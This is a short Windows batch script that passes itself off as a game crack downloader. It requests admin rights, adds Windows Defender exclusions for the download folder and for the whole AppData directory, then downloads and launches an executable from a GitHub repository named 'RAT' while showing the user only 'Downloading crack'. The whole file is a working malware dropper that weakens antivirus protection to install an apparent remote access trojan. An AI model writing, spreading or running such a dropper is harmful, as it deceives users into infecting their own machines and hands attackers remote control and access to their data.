@echo off
:: Elevate to admin if not already running with it
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Set up paths
set "TARGET_DIR=%APPDATA%\SubDir"
set "GAME_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/main/Crack.exe"
set "GAME_FILE=%TARGET_DIR%\Crack.exe"

:: Create directory if needed
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: Add exclusion for the download location BEFORE download
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'"

:: Optionally exclude the entire AppData\Roaming dir too
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'"

:: Clean output
echo Downloading crack

:: Download the file
powershell -Command "Invoke-WebRequest -Uri '%GAME_URL%' -OutFile '%GAME_FILE%' -UseBasicParsing"

:: Wait for download to complete
:waitloop
if exist "%GAME_FILE%" (
    goto run
) else (
    timeout /t 1 >nul
    goto waitloop
)

:run
start "" "%GAME_FILE%"
exit /b
